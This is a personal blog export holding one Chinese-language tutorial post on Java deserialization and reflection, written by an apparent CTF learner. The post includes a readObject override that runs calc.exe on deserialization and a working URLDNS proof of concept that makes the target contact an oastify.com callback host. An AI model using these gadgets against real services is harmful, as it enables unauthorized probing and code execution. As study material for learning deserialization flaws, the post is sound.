{"pages":[{"title":"","text":"about me Whoami : zIxyd Contact : Mjk3MjkxNDY5Mg== Dream : 重生之我要当大黑阔 Age : 19 CTF: WEB/PWN Skill : 精通 Python/Java/C/C++/PHP/JavaScript的Hello World","link":"/about/index.html"},{"title":"","text":"","link":"/links/index.html"}],"posts":[{"title":"Java反序列化基础","text":"重写readObject来执行命令12345678910111213141516171819202122232425262728293031323334353637383940414243444546//Studentpackage test;import java.io.IOException;import java.io.Serializable;public class Student implements Serializable { public String name; public int age; public Student() { } public Student(String name, int age) { this.name = name; this.age = age; } public String getName() { return name; } public void setName(String name) { this.name = name; } public int getAge() { return age; } public void setAge(int age) { this.age = age; }// @Override public String toString() { // 返回对象的字符串表示 return &quot;Student{&quot; + &quot;name='&quot; + name + '\\'' + &quot;, age=&quot; + age + '}'; } //重写readObject private void readObject(java.io.ObjectInputStream in) throws IOException, ClassNotFoundException{ //执行默认的readObject()方法 in.defaultReadObject(); //执行命令 Runtime.getRuntime().exec(&quot;calc.exe&quot;); }} 1234567891011121314151617//Serializepackage test;import java.io.FileOutputStream;import java.io.IOException;import java.io.ObjectOutputStream;public class abc { public static void main(String[] args) throws IOException { Student stu = new Student(&quot;lisi&quot;,18); ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;a.txt&quot;)); oos.writeObject(stu); System.out.println(stu); oos.close(); }} 1234567891011121314151617181920//Unserializepackage test;import java.io.FileInputStream;import java.io.IOException;import java.io.ObjectInputStream;public class unseralize { public static void main(String[] args) throws IOException, ClassNotFoundException { ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;a.txt&quot;)); Object o = ois.readObject(); System.out.println(o); ois.close(); }} Java(反射基础)Java反射是指在运行时动态地获取、检查和操作类的信息的机制。它允许程序在运行时通过类的名称来获取类的详细信息，包括类的构造函数、方法、字段等，并且可以在运行时动态地创建对象、调用方法和访问字段。反射机制使得程序可以在编译时无法确定具体类的情况下，通过名称来操作类，从而提供了更大的灵活性和动态性。 反射获取class对象1234567891011121314151617181920public class test01 { public static void main(String[] args) throws ClassNotFoundException { /* 获取class对象的三种方式 Class.forName(&quot;全类名&quot;) 全类名：包名+类名 类名.class 对象。getClass() */ Class clazz01 = Class.forName(&quot;Student&quot;); System.out.println(clazz01); Class clazz02 = Student.class; System.out.println(clazz02); Student s = new Student(); Class clazz03 = s.getClass(); System.out.println(clazz03); }} 反射获取构造方法123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263import java.lang.reflect.Constructor;import java.lang.reflect.InvocationTargetException;import java.lang.reflect.Parameter;public class test01 { public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException { /* Class类中用于获取构造方法的方法 Class类中用于获取构造方法的方法 Constructor&lt;?&gt;[]getConstructors():返回所有公共构造方法对象的数组 Constructor&lt;?&gt;[]getDeclaredConstructors():返回所有构造方法对象的数组 Constructor&lt;T&gt;getConstructor(Class&lt;?&gt;…parameterTypes):返回单个公共构造方法对象 Constructor&lt;-T&gt;getDeclaredConstructor((Class&lt;?&gt;parameterTypes):返回单个构造方法对象 */ //获取Class字节码文件对象 Class clazz = Class.forName(&quot;Student&quot;); System.out.println(&quot;获取所有构造方法&quot;); Constructor[] con = clazz.getDeclaredConstructors(); for (Constructor constructor : con) { System.out.println(constructor.toString()); } System.out.println(&quot;获取无参的构造方法&quot;); Constructor con1 = clazz.getConstructor(); System.out.println(con1); System.out.println(&quot;获取参数为String类型的构造方法&quot;); Constructor con2 = clazz.getDeclaredConstructor(String.class); System.out.println(con2); System.out.println(&quot;获取参数为int类型的构造方法&quot;); Constructor con3 = clazz.getDeclaredConstructor(int.class); System.out.println(con3); System.out.println(&quot;获取参数为Sting类型和int类型的构造方法&quot;); Constructor con4 = clazz.getDeclaredConstructor(String.class,int.class); System.out.println(con4); System.out.println(&quot;获取构造方法的权限修饰符&quot;); /* public : 1 protected : 4 private : 2 */ int modifiers = con4.getModifiers(); System.out.println(modifiers); System.out.println(&quot;获取构造方法的参数&quot;); Parameter[] parameters = con4.getParameters(); for(Parameter parameter : parameters){ System.out.println(parameter); } System.out.println(&quot;创建对象&quot;); con4.setAccessible(true); Object stu = con4.newInstance(&quot;张三&quot;, 18); System.out.println(stu); }} 反射获取成员变量1234567891011121314151617181920212223242526272829303132333435363738394041424344import java.lang.reflect.Field;public class test02 { public static void main(String[] args) throws ClassNotFoundException, NoSuchFieldException, IllegalAccessException { /* Field[] getFields():返回所有公共成员变量对象的数组 Field[] getDeclaredFields():返回所有成员变量对象的数组 Field getField(String name):返回单个公共成员变量对象 Field getDeclaredField(String name):返回单个成员变量对象 */ System.out.println(&quot;获取class字节码文件对象&quot;); Class clazz = Class.forName(&quot;Student&quot;); System.out.println(&quot;获取所有成员变量对象&quot;); Field[] fields = clazz.getDeclaredFields(); for (Field field :fields){ System.out.println(field); } System.out.println(&quot;获取name成员变量&quot;); Field name = clazz.getDeclaredField(&quot;name&quot;); System.out.println(name); System.out.println(&quot;获取权限修饰符&quot;); int modifiers = name.getModifiers(); System.out.println(modifiers); System.out.println(&quot;获取Name&quot;); String n = name.getName(); System.out.println(n); System.out.println(&quot;获取成员变量记录的值&quot;); Student s = new Student(&quot;李四&quot;,18,&quot;男&quot;); name.setAccessible(true); Object value = name.get(s); System.out.println(value); System.out.println(&quot;修改成员变量记录的值&quot;); name.set(s,&quot;张三&quot;); Object value2 = name.get(s); System.out.println(value2); }} URLDNSpoc1234567891011121314151617181920212223242526272829303132import java.io.FileNotFoundException;import java.io.FileOutputStream;import java.io.IOException;import java.io.ObjectOutputStream;import java.lang.reflect.Field;import java.net.MalformedURLException;import java.net.URL;import java.util.HashMap;public class Serialize { public static void main(String[] args) throws IOException, NoSuchFieldException, IllegalAccessException { HashMap&lt;URL, Integer&gt; hashmap = new HashMap&lt;URL, Integer&gt;(); URL url = new URL(&quot;http://9t3yg0l28pe8p1dypavjbhwf66cx0o1cq.oastify.com&quot;); Class c = url.getClass(); Field hashcodefield = c.getDeclaredField(&quot;hashCode&quot;); hashcodefield.setAccessible(true); hashcodefield.set(url,2); //在hashmap.put中调用了putVal() hashmap.put(url, 1); ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;a.bin&quot;)); hashcodefield.set(url,-1); oos.writeObject(hashmap); oos.close(); }} 12345678910111213import java.io.FileInputStream;import java.io.FileNotFoundException;import java.io.IOException;import java.io.ObjectInputStream;public class unSerialize { public static void main(String[] args) throws IOException, ClassNotFoundException { ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;a.bin&quot;)); ois.readObject(); ois.close(); }} pop gadget12345Gadget Chain: HashMap.readObject() HashMap.putVal() HashMap.hash() URL.hashCode() 可以理解为, 在序列化 HashMap 类的对象时, 为了减小序列化后的大小, 并没有将整个哈希表保存进去, 而是仅仅保存了所有内部存储的 key 和 value. 所以在反序列化时, 需要重新计算所有 key 的 hash, 然后与 value 一起放入哈希表中. 而恰好, URL 这个对象计算 hash 的过程中用了 getHostAddress 查询了 URL 的主机地址, 自然需要发出 DNS 请求. 我在学习URLDNS中遇到一个问题：尽管我setAccessible(true);还是会报错： Unable to make field private int java.net.URL.hashCode accessible: module java.base does not “opens java.net” to unnamed module @5b480cf9,解决方法：更换jdk版本到1.8 动态代理在Java中，动态代理是一种机制，它允许在运行时创建代理对象，以代替原始对象执行特定的操作。代理对象可以拦截对原始对象的方法调用，并在调用前后执行额外的逻辑。","link":"/2023/11/01/java(unserialize)/"}],"tags":[{"name":"Java","slug":"Java","link":"/tags/Java/"},{"name":"unSerialize","slug":"unSerialize","link":"/tags/unSerialize/"}],"categories":[]}